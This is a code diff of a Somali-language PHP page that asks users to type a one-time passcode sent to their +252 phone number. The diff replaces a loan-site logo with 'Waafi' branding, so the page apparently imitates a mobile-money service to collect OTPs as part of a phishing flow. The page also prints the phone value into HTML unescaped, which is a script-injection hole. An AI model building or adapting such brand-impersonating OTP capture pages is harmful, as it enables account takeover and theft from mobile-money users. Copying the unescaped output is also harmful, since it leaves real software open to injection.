@@ -16,23 +16,120 @@ if(empty($phone)){
 ?>
 
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>OTP</title>
-    <link rel="stylesheet" href="style.css">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>OTP Verification</title>
+
+<style>
+body {
+    margin: 0;
+    font-family: Arial, sans-serif;
+    background: linear-gradient(to bottom, #9be000, #6cc000);
+}
+
+/* HEADER */
+.header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 15px;
+    color: #333;
+    background: #fff;
+}
+
+.header h2 {
+    margin: 0;
+    color: #4CAF50;
+}
+
+/* CARD */
+.container {
+    background: #fff;
+    margin: 40px 15px;
+    padding: 25px;
+    border-radius: 20px;
+    text-align: center;
+    box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+}
+
+.container h2 {
+    margin-bottom: 10px;
+}
+
+.phone {
+    font-weight: bold;
+    margin: 10px 0 20px;
+}
+
+/* OTP BOXES */
+.otp-box {
+    display: flex;
+    justify-content: center;
+    gap: 10px;
+    margin: 20px 0;
+}
+
+.otp-box input {
+    width: 45px;
+    height: 55px;
+    text-align: center;
+    font-size: 20px;
+    border: 2px solid #4CAF50;
+    border-radius: 10px;
+    outline: none;
+}
+
+/* RESEND TEXT */
+.resend {
+    margin: 10px 0;
+    color: #777;
+}
+
+.resend span {
+    color: #4CAF50;
+    font-weight: bold;
+    cursor: pointer;
+}
+
+/* BUTTON */
+button {
+    width: 100%;
+    padding: 15px;
+    background: #ccc;
+    border: none;
+    border-radius: 10px;
+    font-size: 16px;
+    color: #fff;
+}
+
+/* FOOTER CURVE */
+.footer {
+    margin-top: 80px;
+    text-align: center;
+    color: white;
+    padding: 30px;
+}
+</style>
 </head>
 
 <body>
-<!-- Top Logo -->
-<div class="logo-container">
-    <img src="logo.png" alt="INBUCKS QUICK EASY LOANS Logo" class="logo">
+
+<!-- HEADER -->
+<div class="header">
+    <span>←</span>
+    <h2>Waafi</h2>
+    <span>☰</span>
 </div>
 
-<div class="card">
+<!-- MAIN CARD -->
+<div class="container">
 
-<h1>Xaqiijinta OTP-ga kowaad</h1>
+    <h2>Xaqiijinta OTP-ga Kowaad</h2>
 
-<h1>Geli OTP-ga kowaad ee loogu diray lambarka taleefankaaga</h1>
+    <p>Geli OTP-ga kowaad ee loogu diray lambarka taleefankaaga</p>
 
 <h3>+252 <?php echo $phone; ?></h3>
 
@@ -58,6 +155,13 @@ if(empty($phone)){
 </form>
 
 </div>
+<!-- FOOTER -->
+<div class="footer">
+    © 2026 Waafi Soomaaliya
+</div>
+
+</body>
+</html>
 <script>
 const inputs = document.querySelectorAll('.otp-boxes input');
 
